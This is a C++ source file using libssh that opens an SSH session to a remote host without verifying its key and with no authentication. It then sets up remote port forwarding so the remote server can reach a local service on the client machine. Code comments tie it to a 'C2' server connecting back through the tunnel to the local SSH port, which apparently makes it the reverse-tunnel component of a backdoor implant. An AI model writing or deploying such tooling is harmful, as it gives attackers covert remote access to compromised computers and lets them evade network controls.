#define LIBSSH_STATIC 1

#include <libssh/libssh.h>
#include <libssh/server.h>
#include <stdio.h>

#include "client.h"

#ifdef _WIN32
#include <Ws2tcpip.h>
#define close closesocket
#else
#include <arpa/inet.h>
#endif // _WIN32



SSHClient::SSHClient()
{
}

static int connect_to_local_service(int port)
{
    int sockfd = 0;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
        printf("inet_pton\n");
        return -1;
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("socket\n");
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
        0) {
        printf("connect\n");
        return -1;
    }

    return sockfd;
}

#define CLIENT_SENT_EOF -6
#define SERVICE_SENT_EOF -5
#define SERVICE_CONN_ERROR -4
#define SSH_SENT_EOF -3
#define SYSTEM_ERROR -2

int should_terminate = 0;

static int do_remote_forwarding_loop(ssh_session session,
    ssh_channel channel, int lport)
{
    /* Connect to the service */
    int sockfd;

    int rc;
    printf("[OTCP] Connecting to localhost:%d...", lport);
    rc = connect_to_local_service(lport);
    if (rc == -1) {
        printf("failed\n");
        return SERVICE_CONN_ERROR;
    }
    printf("done\n");

    sockfd = rc;

#ifdef _WIN32
    u_long iMode = 1;
    ioctlsocket(sockfd, FIONBIO, &iMode);
#endif // _WIN32

    int nbytes = 0, nwritten = 0;

#define BUF_SIZE 4096
    char *buffer = (char*)malloc(BUF_SIZE);
    if (!buffer) {
        printf("[DEBUG] malloc\n");
        return SYSTEM_ERROR;
    }
#ifdef _WIN32
#define EVENTS POLLIN 
#else
#define EVENTS (POLLIN | POLLPRI)

#endif // _WIN32
    int ssh_fd = ssh_get_fd(session);
    struct pollfd fds[2];
    fds[0].fd = ssh_fd;
    fds[0].events = EVENTS;
    fds[1].fd = sockfd;
    fds[1].events = EVENTS;

    while (!should_terminate) {
#ifdef _WIN32
        rc = WSAPoll(fds, 2, -1);
        auto a = WSAGetLastError();
#else
        rc = poll(fds, 2, -1);
#endif // _WIN32  
        if (rc == -1) {
            free(buffer);
            close(sockfd);
            return SYSTEM_ERROR;
        }

        if (fds[0].revents & POLLIN) {
            nbytes =
                ssh_channel_read_nonblocking(channel, buffer,
                    BUF_SIZE, 0);
            if (nbytes == 0) {
                if (ssh_channel_is_eof(channel) ||
                    !ssh_channel_is_open(channel)) {
                    free(buffer);
                    close(sockfd);
                    return SSH_SENT_EOF;
                }
            }
            if (nbytes == SSH_ERROR) {
                printf("[DEBUG] ssh_channel_read_nonblocking: %s\n",
                    ssh_get_error(session));
                free(buffer);
                close(sockfd);
                return SSH_ERROR;
            }
            if (nbytes > 0) {
                printf
                ("[DEBUG] Read %d bytes from SSH tunnel\n",
                    nbytes);

                /* Write to service */
                int tot_sent = 0;
                while (tot_sent < nbytes) {
#ifdef _WIN32
                    nwritten = send(sockfd,
                        buffer + tot_sent,
                        nbytes - tot_sent,
                        0);
#else
                    nwritten = send(sockfd,
                        buffer + tot_sent,
                        nbytes - tot_sent,
                        MSG_DONTWAIT);
#endif // _WIN32
                    
                    if (nwritten < 0) {
                        if (errno != EAGAIN
                            && errno != EWOULDBLOCK) {
                            free(buffer);
                            close(sockfd);
                            return
                                SERVICE_CONN_ERROR;
                        }
                    }
                    else {
                        tot_sent += nwritten;
                        printf
                        ("[DEBUG] Sent %d bytes to service\n",
                            nwritten);
                    }
                }
            }
            else {
                /* Assume client has closed connection
                   to rport on remote side */
                free(buffer);
                close(sockfd);
                return CLIENT_SENT_EOF;
            }
        }

        if (fds[1].revents & POLLIN) {
#ifdef _WIN32
            nbytes = recv(sockfd, buffer, BUF_SIZE, 0);
#else
            nbytes = recv(sockfd, buffer, BUF_SIZE, MSG_DONTWAIT);
#endif // _WIN32      
            if (nbytes < 0) {
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    char err[10];
                    strerror_s(err, 10, errno);
                    printf("recv: %s\n", err);
                    free(buffer);
                    close(sockfd);
                    return SERVICE_CONN_ERROR;
                }
            }
            else if (nbytes == 0) {
                printf("recv: EOF\n");
                free(buffer);
                close(sockfd);
                return SERVICE_SENT_EOF;
            }
            printf("[DEBUG] Read %d bytes from service\n", nbytes);

            int tot_sent = 0;
            while (tot_sent < nbytes) {
                nwritten = ssh_channel_write(channel,
                    buffer + tot_sent,
                    nbytes - tot_sent);
                if (nwritten == SSH_ERROR) {
                    printf("ssh_channel_write: %s\n",
                        ssh_get_error(session));
                    free(buffer);
                    close(sockfd);
                    return SSH_ERROR;
                }
                else {
                    tot_sent += nwritten;
                    printf
                    ("[DEBUG] Sent %d bytes to SSH tunnel\n",
                        nwritten);
                }
            }
        }
    }
    return SSH_OK;
}

/* OpenSSH command equivalent:
 * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
 *
 * lport:   port to forward to once tunnel established  // usually 22 for us 2222
 * rport:   port the ssh server will be listening on    // we will do in the C2: ssh localhost -p [rport]
 */
int do_remote_forwarding(ssh_session sess, int lport, int rport)
{
    printf("[OTCP] Opening port T:%d on server...\n", lport);
    int bounded_port;
    int nbytes, nwritten;
    char buffer[256];
    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", NULL, &bounded_port);
    if (rc != SSH_OK) {
        printf("failed: %s\n", ssh_get_error(sess));
        ssh_disconnect(sess);
        ssh_free(sess);
        return -1;
    }
    printf("Check port %d in remote server\n", bounded_port);

    while (!should_terminate) {
        int dport = 0;	// The port bound on the server, here: 8080
        printf("[OTCP] Waiting for incoming connection...");
        fflush(stdout);

#define ACCEPT_FORWARD_TIMEOUT 15000	// ms
        ssh_channel chan = ssh_channel_accept_forward(sess,
            ACCEPT_FORWARD_TIMEOUT,
            &dport);
        if (chan == NULL) {
            if (ssh_get_error_code(sess) != 0) {	/* Timed out */
                printf("failed: %s\n",
                    ssh_get_error(sess));
                ssh_disconnect(sess);
                ssh_free(sess);
                return -1;
            }
            else {
                continue;
            }
        }
        printf("\n[OTCP] Connection received\n");

        rc = do_remote_forwarding_loop(sess, chan, lport);
        if (rc == SSH_SENT_EOF || rc == SSH_ERROR || rc == SYSTEM_ERROR) {
            printf("[OTCP] Terminate SSH channel\n");
            ssh_channel_send_eof(chan);
            ssh_channel_free(chan);
            ssh_disconnect(sess);
            ssh_free(sess);
            return 1;
        }
        else {
            /* The service has either sent EOF
               or an error condition occurred, but
               the tunnel is still open.
               Accept a new connection. */
            printf("[DEBUG] Service disconnected\n");
            ssh_channel_send_eof(chan);
            printf("[DEBUG] Sent SSH EOF\n");
            ssh_channel_free(chan);
            printf("[DEBUG] Freed channel\n");
            continue;
        }
    }

    ssh_disconnect(sess);
    ssh_free(sess);
    return 1;
}


int SSHClient::run(const char* username, const char* host, int port)
{
    ssh_session my_ssh_session;
    int verbosity = SSH_LOG_PROTOCOL;
    int rc;

    
    // Open session and set options
    my_ssh_session = ssh_new();
    if (my_ssh_session == NULL)
        exit(-1);
    auto a = ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT_STR, "22");

    // Connect to server
    rc = ssh_connect(my_ssh_session);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "Error connecting to %s: %s\n",
            host,
            ssh_get_error(my_ssh_session));
        ssh_free(my_ssh_session);
        exit(-1);
    }
    // Verify the server's identity
    // For the source code of verify_knownhost(), check previous example
    /*if (verify_knownhost(my_ssh_session) < 0)
    {
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        exit(-1);
    }*/
    // Authenticate ourselves
    //rc = ssh_userauth_password(my_ssh_session, username, password);
    rc = ssh_userauth_none(my_ssh_session, username);
    if (rc != SSH_AUTH_SUCCESS)
    {
        fprintf(stderr, "Error authenticating with password: %s\n",
            ssh_get_error(my_ssh_session));
        ssh_disconnect(my_ssh_session);
        ssh_free(my_ssh_session);
        exit(-1);
    }


    // do something
    do_remote_forwarding(my_ssh_session, port, 1234);

    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    ssh_finalize();
    return 0;
}

